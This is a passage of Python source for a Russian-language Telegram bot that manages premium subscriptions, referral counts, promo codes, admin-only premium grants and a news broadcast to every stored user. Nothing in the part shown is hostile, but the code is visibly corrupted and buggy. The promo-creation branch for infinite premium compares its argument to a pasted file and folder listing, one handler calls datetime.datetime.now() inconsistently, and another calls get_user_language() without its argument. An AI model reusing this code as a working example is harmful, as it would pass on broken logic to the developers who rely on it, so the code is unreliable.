            bot.send_photo(message.chat.id, photo, caption="🔗 " + "\n🔗 ".join([f"http://yuordomain/{link[0]}" for link in links]))
    else:
        lang = get_user_language(user_id)
        with open('images/error.jpg', 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=texts[lang]['nolinks'])
    cursor.close()
    db.close()

def start_monitoring():
    monitor_thread = threading.Thread(target=monitor_refers)
    monitor_thread.daemon = True
    monitor_thread.start()

def is_premium(user_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()

    c.execute('SELECT expiry_date FROM premium_us WHERE user = ?', (str(user_id),))
    result = c.fetchone()

    if result:
        expiry_date = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
        if expiry_date > datetime.now():
            conn.close()
            return True
        else:
            c.execute('DELETE FROM premium_us WHERE user = ?', (str(user_id),))
            conn.commit()
            conn.close()
            return False
    else:
        conn.close() 
        return False

@bot.message_handler(func=lambda message: message.text in ['✨ FREE PREMIUM', '✨ БЕСПЛАТНЫЙ ПРЕМИУМ'])
def free_prem(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    referral_link = f"https://t.me/yuorbotname?start={user_id}"
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton(texts[lang]['allinfo_menu'], callback_data='allinfo')
    markup.add(btn)

    reply_message = texts[lang]['freeprem_reply'].format(referral_link=referral_link)
    with open('images/freepremium.jpg', 'rb') as photo:
        bot.send_photo(message.chat.id, photo, caption=reply_message, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['npmenu'])
def nonPremiumMenu(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    if is_premium(user_id):
        bot.send_message(message.chat.id, texts[lang]['premacc'])
    else:
        markup = types.InlineKeyboardMarkup()
        b1 = types.InlineKeyboardButton(texts[lang]['allinfo_menu'], callback_data='allinfo')
        b2 = types.InlineKeyboardButton(texts[lang]['refferals_menu'], callback_data='refferals')
        b3 = types.InlineKeyboardButton(texts[lang]['buyprem_menu'], callback_data='buypremium')
        markup.add(b1, b2, b3)
        bot.send_message(message.chat.id, texts[lang]['war3'], reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'refferals')
def refferals_info(call):
    user_id = str(call.from_user.id)
    conn = sqlite3.connect(DB)
    c = conn.cursor()

    c.execute('SELECT refferals FROM refferals_us WHERE user=?', (user_id,))
    refferals_data = c.fetchone()
    refferals = refferals_data[0] if refferals_data else "0"

    lang = get_user_language(user_id)

    referral_link = f"https://t.me/yuorbotname?start={user_id}"
    message_text = texts[lang]['referrals_info'].format(refferals=refferals, referral_link=referral_link)
    with open('images/referrals.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption=message_text, parse_mode='Markdown')

    conn.close()

@bot.callback_query_handler(func=lambda call: call.data == 'allinfo')
def all_info(call):
    user_id = str(call.from_user.id)
    conn = sqlite3.connect(DB)
    c = conn.cursor()

    lang = get_user_language(user_id)

    c.execute('SELECT refferals FROM refferals_us WHERE user=?', (user_id,))
    refferals_data = c.fetchone()
    refferals = refferals_data[0] if refferals_data else "0"

    if is_premium(user_id):
        messages_count = texts[lang]['unlimited']
    else:
        c.execute('SELECT messages_count FROM messages_us WHERE user=?', (user_id,))
        messages_data = c.fetchone()
        messages_count = messages_data[0] if messages_data else "0"

    referral_link = f"https://t.me/yuorbotname?start={user_id}"
    message_text = texts[lang]['account_info'].format(refferals=refferals, messages_count=messages_count, referral_link=referral_link)
    with open('images/allinfo.jpg', 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo, caption=message_text, parse_mode='Markdown')

    conn.close()

@bot.callback_query_handler(func=lambda call: call.data == 'buypremium')
def buy_premium_menu(call):
    user_id = call.from_user.id
    lang = get_user_language(user_id)
    
    if is_premium(user_id):
        message1 = texts[lang]['premacc']
        bot.send_message(call.message.chat.id, message1, parse_mode='Markdown')
    else:
        message = texts[lang]['buypremium1']
        with open('images/buypremium.jpg', 'rb') as photo:
            bot.send_photo(call.message.chat.id, photo, caption=message, parse_mode='Markdown')

def check_premium_reward(user_id):
    lang = get_user_language()
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT refferals FROM refferals_us WHERE user=?', (user_id,))
    refferals = c.fetchone()
    if refferals and refferals[0] >= 20:
        expiry_date = datetime.now() + timedelta(days=30)
        c.execute('INSERT INTO premium_us (user, expiry_date) VALUES (?, ?)', (user_id, expiry_date.strftime('%Y-%m-%d %H:%M:%S')))
        bot.send_message(user_id, texts[lang]['freeprem_month'])
    conn.commit()
    conn.close()

@bot.message_handler(commands=['usepromo'])
def initiate_use_promo(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    bot.reply_to(message, texts[lang]['prompt_promo_code'])
    bot.register_next_step_handler(message, use_promo)

def use_promo(message):
    try:
        user_id = message.from_user.id
        promo_code = message.text.strip()

        if not promo_code:
            lang = get_user_language(user_id)
            bot.reply_to(message, texts[lang]['no_promo_code'])
            return
        
        conn = sqlite3.connect(DB)
        c = conn.cursor()

        c.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (user_id,))
        referral_count = c.fetchone()[0]
        
        if referral_count < 1:
            lang = get_user_language(user_id)
            bot.reply_to(message, texts[lang]['no_referrals'])
            conn.close()
            return

        c.execute('SELECT reward_type, reward_value, expiry_date FROM promo_codes WHERE code = ?', (promo_code,))
        promo_data = c.fetchone()
        
        if promo_data:
            reward_type = promo_data[0]
            reward_value = promo_data[1]
            expiry_date = promo_data[2]

            c.execute('SELECT COUNT(*) FROM used_promos WHERE user_id = ? AND promo_code = ?', (user_id, promo_code))
            promo_used = c.fetchone()[0]

            if promo_used > 0:
                lang = get_user_language(user_id)
                bot.reply_to(message, texts[lang]['promo_used'])
            else:
                if reward_type == 'infinite_premium':
                    c.execute('UPDATE premium_us SET expiry_date = ? WHERE user = ?', ('2099-12-31 23:59:59', user_id))
                
                elif reward_type == 'premium_month':
                    new_expiry_date = datetime.datetime.now() + timedelta(days=30)
                    c.execute('UPDATE premium_us SET expiry_date = ? WHERE user = ?', (new_expiry_date.strftime('%Y-%m-%d %H:%M:%S'), user_id))
                
                elif reward_type == 'messages':
                    c.execute('UPDATE messages_us SET messages_count = messages_count + ? WHERE user = ?', (reward_value, user_id))
                
                c.execute('INSERT INTO used_promos (user_id, promo_code) VALUES (?, ?)', (user_id, promo_code))
                conn.commit()

                lang = get_user_language(user_id)
                bot.reply_to(message, texts[lang]['promo_success'])
        else:
            lang = get_user_language(user_id)
            bot.reply_to(message, texts[lang]['invalid_promo'])

        conn.close()
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")


#Admin commands:

@bot.message_handler(commands=['giveprem_month'])
def gpm(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()

            args = message.text.split()
            if len(args) < 2:
                bot.reply_to(message, "Недостаточно параметров. Формат: /giveprem_month <user_id>")
                return

            user_id = args[1]
            expiry_date = datetime.now() + timedelta(days=30)
            conn = sqlite3.connect(DB)
            c = conn.cursor()

            c.execute('SELECT COUNT(*) FROM premium_us WHERE user = ?', (user_id,))
            exists = c.fetchone()[0]
            
            if exists:
                c.execute('UPDATE premium_us SET expiry_date = ? WHERE user = ?', (expiry_date.strftime('%Y-%m-%d %H:%M:%S'), user_id))
            else:
                c.execute('INSERT INTO premium_us (user, expiry_date) VALUES (?, ?)', (user_id, expiry_date.strftime('%Y-%m-%d %H:%M:%S')))
            
            conn.commit()
            conn.close()
            bot.send_message(user_id, "Вам выдан премиум на месяц.")
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {e}")
    else:
        bot.reply_to(message, texts[lang]['netprav'])

@bot.message_handler(commands=['giveprem_forever'])
def gpf(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()

            args = message.text.split()
            if len(args) < 2:
                bot.reply_to(message, "Недостаточно параметров. Формат: /giveprem_forever <user_id>")
                return

            user_id = args[1]
            conn = sqlite3.connect(DB)
            c = conn.cursor()

            c.execute('SELECT COUNT(*) FROM premium_us WHERE user = ?', (user_id,))
            exists = c.fetchone()[0]
            
            if exists:
                c.execute('UPDATE premium_us SET expiry_date = ? WHERE user = ?', ('2099-12-31 23:59:59', user_id))
            else:
                c.execute('INSERT INTO premium_us (user, expiry_date) VALUES (?, ?)', (user_id, '2099-12-31 23:59:59'))
            
            conn.commit()
            conn.close()
            bot.send_message(user_id, "Вам выдан бессрочный премиум.")
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {e}")
    else:
        bot.reply_to(message, texts[lang]['netprav'])


@bot.message_handler(commands=['createpromo'])
def createPromo(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        try:
            args = message.text.split()
            if len(args) < 4:
                bot.reply_to(message, "Недостаточно параметров. Формат: /createpromo <код> <тип> <значение>")
                return

            promo_code = args[1]
            reward_type = args[2]
            reward_value = args[3]
            
            conn = sqlite3.connect(DB)
            c = conn.cursor()

            if reward_type == "databases images photos templates 32px_icon.png 48px_icon.png flask_app.py mysql.txt newbot.py news.json settings.json":
                c.execute('INSERT INTO promo_codes (code, reward_type, reward_value) VALUES (?, ?, ?)', 
                          (promo_code, 'infinite_premium', None))
                bot.reply_to(message, f"Промокод {promo_code} создан для бесконечного премиума.")
            
            elif reward_type == "premium_month":
                days = 30
                expiry_date = datetime.now() + timedelta(days=days)
                c.execute('INSERT INTO promo_codes (code, reward_type, reward_value, expiry_date) VALUES (?, ?, ?, ?)', 
                          (promo_code, 'premium_month', None, expiry_date.strftime('%Y-%m-%d %H:%M:%S')))
                bot.reply_to(message, f"Промокод {promo_code} создан на месяц премиума.")
            
            elif reward_type == "messages":
                c.execute('INSERT INTO promo_codes (code, reward_type, reward_value) VALUES (?, ?, ?)', 
                          (promo_code, 'messages', int(reward_value)))
                bot.reply_to(message, f"Промокод {promo_code} создан на {reward_value} сообщений.")
            
            conn.commit()
            conn.close()
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {e}")
    else:
        bot.reply_to(message, texts[lang]['netprav'])

@bot.message_handler(commands=['list'])
def list_users(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        user_count = c.fetchone()[0]
        bot.send_message(message.chat.id, f"Всего пользователей: {user_count}")
        conn.close()
    else:
        bot.reply_to(message, texts[lang]['netprav'])

def save_news(news_text):
    news_file = 'news.json'
    news_data = {'news': news_text}
    with open(news_file, 'w', encoding='utf-8') as file:
        json.dump(news_data, file)

@bot.message_handler(commands=['addnews'])
def add_news(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        msg = bot.send_message(message.chat.id, "Введите текст новости:")
        bot.register_next_step_handler(msg, save_news_step)
    else:
        bot.reply_to(message, texts[lang]['netprav'])

def save_news_step(message):
    news_text = message.text
    save_news(news_text)
    bot.send_message(message.chat.id, "Новость сохранена!")

@bot.message_handler(commands=['seenews'])
def see_news(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        news_file = 'news.json'
        if os.path.exists(news_file):
            with open(news_file, 'r', encoding='utf-8') as file:
                news_data = json.load(file)
                bot.send_message(message.chat.id, f"Последняя новость:\n\n{news_data['news']}")
        else:
            bot.send_message(message.chat.id, "Новостей нет.")
    else:
        bot.reply_to(message, texts[lang]['netprav'])

@bot.message_handler(commands=['news'])
def send_news(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        news_file = 'news.json'
        if os.path.exists(news_file):
            with open(news_file, 'r', encoding='utf-8') as file:
                news_data = json.load(file)
                news_text = news_data['news']

            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute("SELECT id FROM users")
            users = c.fetchall()

            successful_users = []

            for user in users:
                try:
                    bot.send_message(user[0], news_text)
                    successful_users.append(user[0])
                except Exception as e:
                    print(f"Error sending message to {user[0]}: {e}")

            bot.send_message(message.chat.id, f"Новость успешно отправлена {len(successful_users)} пользователям.")
            conn.close()
        else:
            bot.send_message(message.chat.id, "Нет сохраненной новости для отправки.")
    else:
        bot.reply_to(message, texts[lang]['netprav'])

@bot.message_handler(commands=['help'])
def help_command(message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, texts[lang]['help_text'])
    else:
        bot.reply_to(message, texts[lang]['netprav'])

if __name__=='__main__':
    start_monitoring()
    while True:
        try:
            bot.polling(non_stop=True, interval=0, timeout=120, skip_pending=True)
        except Exception as e:
            print(e)
            time.sleep(5)
            continue
